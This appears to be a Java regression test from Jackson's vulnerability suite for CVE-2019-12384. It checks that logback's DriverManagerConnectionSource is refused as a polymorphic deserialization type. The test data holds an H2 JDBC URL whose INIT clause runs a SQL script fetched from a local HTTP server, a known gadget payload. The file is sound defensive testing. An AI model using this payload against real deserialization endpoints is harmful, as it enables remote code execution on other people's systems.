package com.fasterxml.jackson.test.vuln;

import com.google.common.collect.ImmutableMap;

public class Logback_2334_CVE2019_12384Test extends VulnTestBase
{
    public void testConnectionFactory() throws Exception
    {
        _testIllegalType(ch.qos.logback.core.db.DriverManagerConnectionSource.class,
                ImmutableMap.of("url",
                        "jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM ‘http://localhost:8000/inject.sql’"
                )
        );
    }

}
